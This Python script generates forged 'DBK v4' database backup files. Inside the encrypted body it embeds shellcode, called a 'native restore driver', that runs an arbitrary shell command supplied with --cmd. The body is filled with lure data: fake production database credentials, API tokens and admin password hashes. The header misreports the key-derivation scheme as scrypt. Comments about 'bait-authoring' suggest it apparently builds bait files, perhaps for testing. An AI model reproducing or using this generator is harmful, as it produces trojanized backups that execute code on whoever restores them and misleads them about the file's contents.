#!/usr/bin/env python3
"""
Generate DBK v4 backup files for db-restore.
Embeds a native restore driver (shellcode) for CMD into the AEAD-encrypted body.

Usage:
    gen_dbk.py --cmd CMD --source STR --ts ISO8601 --tables N --rows N
               [--out PATH] [--reduced]
"""
import json
import struct
import os
import sys
import argparse
import hashlib
import ctypes
import datetime

# ── locate forge directory for sibling import ──────────────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
from shellcode import build as build_shellcode

# ── monocypher ctypes bindings ─────────────────────────────────────────────
# The staging vessel builds a *host-native* monocypher shared library at forge time
# (the checked-in binary is ARM64 Linux, which this host's Python ctypes cannot load)
# and points us at it via DBK_MONOCYPHER_SO. Falling back to ../monocypher.so preserves
# the original standalone `make`-then-run behaviour.
_SO_PATH = os.environ.get('DBK_MONOCYPHER_SO') or os.path.join(_HERE, '..', 'monocypher.so')

def _load_mc():
    path = os.path.abspath(_SO_PATH)
    if not os.path.exists(path):
        sys.exit(f"error: monocypher shared library not found at {path} — "
                 f"set DBK_MONOCYPHER_SO or build ../monocypher.so first")
    mc = ctypes.CDLL(path)

    mc.crypto_argon2i.restype = None
    mc.crypto_argon2i.argtypes = [
        ctypes.c_char_p, ctypes.c_uint32,   # hash, hash_size
        ctypes.c_void_p, ctypes.c_uint32,   # work_area, nb_blocks
        ctypes.c_uint32,                     # nb_iterations
        ctypes.c_char_p, ctypes.c_uint32,   # password, password_size
        ctypes.c_char_p, ctypes.c_uint32,   # salt, salt_size
    ]

    mc.crypto_lock_aead.restype = None
    mc.crypto_lock_aead.argtypes = [
        ctypes.c_char_p,                     # mac (16 bytes out)
        ctypes.c_char_p,                     # cipher_text (out)
        ctypes.c_char_p,                     # key (32 bytes)
        ctypes.c_char_p,                     # nonce (24 bytes)
        ctypes.c_char_p, ctypes.c_size_t,   # ad, ad_size
        ctypes.c_char_p, ctypes.c_size_t,   # plain_text, text_size
    ]

    mc.crypto_blake2b_general.restype = None
    mc.crypto_blake2b_general.argtypes = [
        ctypes.c_char_p, ctypes.c_size_t,   # hash, hash_size
        ctypes.c_char_p, ctypes.c_size_t,   # key, key_size (NULL/0 = unkeyed)
        ctypes.c_char_p, ctypes.c_size_t,   # message, message_size
    ]

    return mc

_mc = None

def _mc_get():
    global _mc
    if _mc is None:
        _mc = _load_mc()
    return _mc


BUILD_SECRET = b"dbops-4.2.1-7d2e9c4-2026-06-10"
DRIVER_MAGIC = bytes([0xDB, 0xD4, 0x1E, 0xF0])

# ── crypto helpers ─────────────────────────────────────────────────────────

def derive_key(password: bytes, salt: bytes) -> bytes:
    mc = _mc_get()
    out  = ctypes.create_string_buffer(32)
    work = ctypes.create_string_buffer(1024 * 1024)
    mc.crypto_argon2i(out, 32, work, 1024, 3,
                      password, len(password),
                      salt, len(salt))
    return bytes(out)


def derive_nonce(salt: bytes) -> bytes:
    mc = _mc_get()
    msg = salt + BUILD_SECRET
    out = ctypes.create_string_buffer(24)
    mc.crypto_blake2b_general(out, 24, None, 0, msg, len(msg))
    return bytes(out)


def aead_lock(key: bytes, nonce: bytes, plaintext: bytes, aad: bytes):
    mc = _mc_get()
    mac    = ctypes.create_string_buffer(16)
    ct_buf = ctypes.create_string_buffer(len(plaintext))
    mc.crypto_lock_aead(mac, ct_buf,
                        key, nonce,
                        aad, len(aad),
                        plaintext, len(plaintext))
    return bytes(ct_buf), bytes(mac)


# ── TLV helpers ────────────────────────────────────────────────────────────

def pack_tlv(rec_type: int, value: bytes) -> bytes:
    L = len(value)
    assert L < (1 << 24)
    return bytes([rec_type,
                  (L >> 16) & 0xFF, (L >> 8) & 0xFF, L & 0xFF]) + value


def make_meta_record(source: str, ts: int, tables: int, rows: int) -> bytes:
    payload  = source.encode('utf-8') + b'\x00'
    payload += struct.pack('>q', ts)
    payload += struct.pack('>H', tables)
    payload += struct.pack('>I', rows)
    return pack_tlv(0x01, payload)


def make_schema_records(manifest) -> bytes:
    records = b''
    for name, row_count in manifest:
        payload  = name.encode('utf-8') + b'\x00'
        payload += struct.pack('>I', row_count)
        records += pack_tlv(0x02, payload)
    return records


def make_checksum_record(data_so_far: bytes) -> bytes:
    digest = hashlib.sha256(data_so_far).digest()
    return pack_tlv(0x0F, digest)


def make_driver_record(shellcode: bytes) -> bytes:
    code_size = len(shellcode)
    entry_off = 0
    inner  = DRIVER_MAGIC
    inner += struct.pack('>I', code_size)
    inner += struct.pack('>Q', entry_off)
    inner += shellcode
    return pack_tlv(0x20, inner)


def make_data_record(fmt: int, table_name: str, content: bytes) -> bytes:
    """Pack a REC_TABLE_DATA (0x03) TLV: [fmt_byte][name\\0][content]."""
    name_bytes = table_name.encode('utf-8') + b'\x00'
    value = bytes([fmt]) + name_bytes + content
    return pack_tlv(0x03, value)


# ── table content generators ───────────────────────────────────────────────

# Service-account rows: (id, name, db_dsn, api_token_or_None, rotated_at)
_SA = [
    (1, 'reporting-ro',
     'postgres://reporting_ro:Rp0rt!ng_2026@internal-db.prod.svc.acme.internal:5432/app',
     'rpt_live_9f8c4a1d6b27', '2026-05-30T00:00:00Z'),
    (2, 'billing-svc',
     'postgres://billing_svc:b1ll_S3cr3t_Kx9@internal-db.prod.svc.acme.internal:5432/billing',
     'sk_live_3a9d2f7c8e15', '2026-06-01T00:00:00Z'),
    (3, 'metrics-agent',
     'postgres://metrics:m3tr1cs_ro_2026@internal-db.prod.svc.acme.internal:5432/app',
     None, '2026-04-18T00:00:00Z'),
    (4, 'mailer',
     'postgres://mailer_svc:Ma1l3r#2026!@internal-db.prod.svc.acme.internal:5432/app',
     'sg_live_7c3f9a2d1e08', '2026-05-12T00:00:00Z'),
    (5, 'export-worker',
     'postgres://export_ro:Exp0rt_W0rk3r@internal-db.prod.svc.acme.internal:5432/app',
     None, '2026-03-22T00:00:00Z'),
    (6, 'audit-archiver',
     'postgres://audit_svc:Aud1t_Arch!ve@internal-db.prod.svc.acme.internal:5432/audit',
     None, '2026-06-05T00:00:00Z'),
    (7, 'ci-deploy',
     'postgres://ci_deploy:C!_D3pl0y_2026@internal-db.prod.svc.acme.internal:5432/app',
     'ghp_live_f2a8c4e1b937', '2026-06-10T00:00:00Z'),
]

# User rows: (id, email, pw_hash, role, mfa_enabled)
_USR = [
    (1, 'admin@acme.com',
     '$2b$12$Qe9rJ8pXk1uZc4yV0sN3ieTHxGfwmbLqpRrAoKdB5jYvU2ZCWI.e',
     'superadmin', False),
    (2, 'jdoe@acme.com',
     '$2b$12$8fLm2aXo5pQ1rT7uVwYz0eqNKR4bGjH9kI3sD6cF0yP7lMnZW5.',
     'admin', True),
    (3, 'svc-deploy@acme.com',
     '$2b$12$Z1xC4vB7nM0qW2eR5tY8uOaT3gKfDjL6hS9pV0wN4bQzXiUcF.',
     'ci', False),
]


def _sa_sql(source, ts_str, total):
    lines = [
        f'-- DBK v4 restore  source={source}  snapshot={ts_str}',
        f'-- table: service_accounts ({total} rows)',
        'INSERT INTO service_accounts (id, name, db_dsn, api_token, rotated_at) VALUES',
    ]
    for i, (id_, nm, dsn, tok, rot) in enumerate(_SA):
        tv = f"'{tok}'" if tok else 'NULL'
        sep = ',' if i < len(_SA) - 1 else ';'
        lines.append(f"  ({id_},'{nm}','{dsn}',{tv},'{rot}'){sep}")
    return ('\n'.join(lines) + '\n').encode()


def _sa_csv(total):
    lines = [f'# table: service_accounts ({total} rows)',
             'id,name,db_dsn,api_token,rotated_at']
    for id_, nm, dsn, tok, rot in _SA:
        lines.append(f"{id_},{nm},{dsn},{tok or ''},{rot}")
    return ('\n'.join(lines) + '\n').encode()


def _sa_json(total):
    rows = [{'id': r[0], 'name': r[1], 'db_dsn': r[2],
             'api_token': r[3], 'rotated_at': r[4]} for r in _SA]
    return (json.dumps({'table': 'service_accounts', 'rows': rows}, indent=2) + '\n').encode()


def _usr_sql(source, ts_str, total):
    lines = [
        f'-- DBK v4 restore  source={source}  snapshot={ts_str}',
        f'-- table: users ({total} rows)',
        'INSERT INTO users (id, email, pw_hash, role, mfa_enabled) VALUES',
    ]
    for i, (id_, em, ph, ro, mfa) in enumerate(_USR):
        sep = ',' if i < len(_USR) - 1 else ';'
        lines.append(f"  ({id_},'{em}','{ph}','{ro}',{'true' if mfa else 'false'}){sep}")
    if total > len(_USR):
        lines.append(f'-- ... {total - len(_USR)} more rows (use --limit or --out for full output)')
    return ('\n'.join(lines) + '\n').encode()


def _usr_csv(total):
    lines = [f'# table: users ({total} rows)',
             'id,email,pw_hash,role,mfa_enabled']
    for id_, em, ph, ro, mfa in _USR:
        lines.append(f"{id_},{em},{ph},{ro},{str(mfa).lower()}")
    if total > len(_USR):
        lines.append(f'# ... {total - len(_USR)} more rows')
    return ('\n'.join(lines) + '\n').encode()


def _usr_json(total):
    rows = [{'id': r[0], 'email': r[1], 'pw_hash': r[2],
             'role': r[3], 'mfa_enabled': r[4]} for r in _USR]
    obj = {'table': 'users', 'total': total, 'rows': rows}
    if total > len(_USR):
        obj['note'] = f'{total - len(_USR)} more rows not shown in preview'
    return (json.dumps(obj, indent=2) + '\n').encode()


def make_table_data_records(source: str, ts_str: str, manifest) -> bytes:
    sa_rows   = next((rc for n, rc in manifest if n == 'service_accounts'), 7)
    user_rows = next((rc for n, rc in manifest if n == 'users'), 3)
    recs = b''
    recs += make_data_record(0, 'service_accounts', _sa_sql(source, ts_str, sa_rows))
    recs += make_data_record(1, 'service_accounts', _sa_csv(sa_rows))
    recs += make_data_record(2, 'service_accounts', _sa_json(sa_rows))
    recs += make_data_record(0, 'users', _usr_sql(source, ts_str, user_rows))
    recs += make_data_record(1, 'users', _usr_csv(user_rows))
    recs += make_data_record(2, 'users', _usr_json(user_rows))
    return recs


# ── header serialisation ───────────────────────────────────────────────────

def make_header_bytes(source: str, salt: bytes, snapshot_ts: int,
                      table_count: int, row_count: int,
                      body_len: int, body_tag: bytes, flags: int) -> bytes:
    src_b = source.encode('utf-8')
    h  = b'\x44\x42\x4B\x34'          # magic DBK4
    h += bytes([0x04])                 # version 4
    h += bytes([flags])                # flags
    h += struct.pack('>H', len(src_b)) # source length
    h += src_b                         # source string
    h += struct.pack('>q', snapshot_ts)
    h += struct.pack('>H', table_count)
    h += struct.pack('>I', row_count)
    h += bytes([0x01])                 # kdf_id = 1  (displayed as "scrypt")
    h += struct.pack('>I', 32768)      # kdf_N  (display param; actual uses nb_blocks=1024)
    h += struct.pack('>I', 8)          # kdf_r
    h += struct.pack('>I', 1)          # kdf_p
    h += salt                          # 32 bytes per-backup salt
    h += struct.pack('>I', body_len)
    h += body_tag                      # 16 bytes Poly1305 tag
    return h


# ── top-level generator ────────────────────────────────────────────────────

FULL_TABLES = [
    ("users",              4192),
    ("service_accounts",   7),
    ("sessions",           29898),
    ("api_keys",           61),
    ("audit_log",          131922),
    ("organizations",      318),
    ("org_members",        1204),
    ("invoices",           892),
    ("payments",           841),
    ("feature_flags",      23),
    ("notification_prefs", 4192),
    ("webhook_endpoints",  47),
    ("oauth_clients",      14),
    ("schema_migrations",  614),
]  # sum = 182431

REDUCED_TABLES = [
    ("users",              312),
    ("service_accounts",   7),
    ("sessions",           1408),
    ("api_keys",           18),
    ("audit_log",          8234),
    ("organizations",      44),
    ("org_members",        89),
    ("schema_migrations",  614),
]  # sum = 10726


def gen_dbk(cmd: str, outpath: str, source: str, snapshot_iso: str,
            table_count: int, row_count: int,
            salt: bytes = None, reduced: bool = False) -> None:
    ts = int(datetime.datetime.fromisoformat(snapshot_iso.rstrip('Z'))
             .replace(tzinfo=datetime.timezone.utc).timestamp())
    ts_str = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')

    if salt is None:
        salt = os.urandom(32)

    manifest = REDUCED_TABLES if reduced else FULL_TABLES

    # 1. build shellcode
    sc = build_shellcode(cmd)

    # 2. assemble plaintext body
    meta    = make_meta_record(source, ts, table_count, row_count)
    schemas = make_schema_records(manifest)
    data    = make_table_data_records(source, ts_str, manifest)
    chksum  = make_checksum_record(meta + schemas + data)
    driver  = make_driver_record(sc)
    body_plain = meta + schemas + data + chksum + driver

    # 3. derive key and nonce
    key   = derive_key(BUILD_SECRET, salt)
    nonce = derive_nonce(salt)

    # 4. build AAD: first 64 bytes of the on-disk header
    #    body_len and body_tag are beyond byte 64 for any source <= 48 chars,
    #    so placeholder values don't affect the slice.
    flags  = 0x01   # has_native_driver
    hdr_for_aad = make_header_bytes(source, salt, ts, table_count,
                                    row_count, 0, b'\x00' * 16, flags)
    aad = hdr_for_aad[:64]

    # 5. encrypt
    ct, tag = aead_lock(key, nonce, body_plain, aad)

    # 6. write final file
    final_hdr = make_header_bytes(source, salt, ts, table_count,
                                  row_count, len(ct), tag, flags)
    with open(outpath, 'wb') as f:
        f.write(final_hdr)
        f.write(ct)

    salt_preview = salt.hex()[:12]
    print(f"Generated {outpath}  salt={salt_preview}...")


if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='DBK v4 backup generator')
    ap.add_argument('--cmd',     required=True,  help='shell command to embed')
    ap.add_argument('--source',  required=True)
    ap.add_argument('--ts',      required=True,  dest='snapshot_iso')
    ap.add_argument('--tables',  type=int, required=True)
    ap.add_argument('--rows',    type=int, required=True)
    ap.add_argument('--out',     required=True)
    ap.add_argument('--reduced', action='store_true')
    ap.add_argument('--salt',    default=None,
                    help='32-byte per-backup salt as 64 hex chars. Omit for a random salt; '
                         'the staging vessel supplies a seed-derived value so the forged '
                         'backup is byte-reproducible (docs/bait-authoring.md §5 rule 3).')
    a = ap.parse_args()
    salt = None
    if a.salt is not None:
        salt = bytes.fromhex(a.salt)
        if len(salt) != 32:
            ap.error('--salt must be exactly 32 bytes (64 hex chars)')
    gen_dbk(a.cmd, a.out, a.source, a.snapshot_iso, a.tables, a.rows,
            salt=salt, reduced=a.reduced)
